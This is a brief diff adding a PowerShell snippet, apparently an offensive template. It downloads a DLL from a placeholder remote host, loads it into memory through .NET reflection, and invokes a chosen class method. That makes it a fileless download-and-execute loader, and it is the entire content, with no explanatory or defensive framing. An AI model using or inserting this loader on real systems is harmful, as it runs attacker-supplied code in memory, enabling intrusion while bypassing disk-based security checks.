@@ -1,0 +1,5 @@
+$data = (New-Object System.Net.WebClient).DownloadData('http://ip/lib.dll')
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("<file.class>")
+$method = $class.GetMethod("<method>")
+$method.Invoke(0, $null)
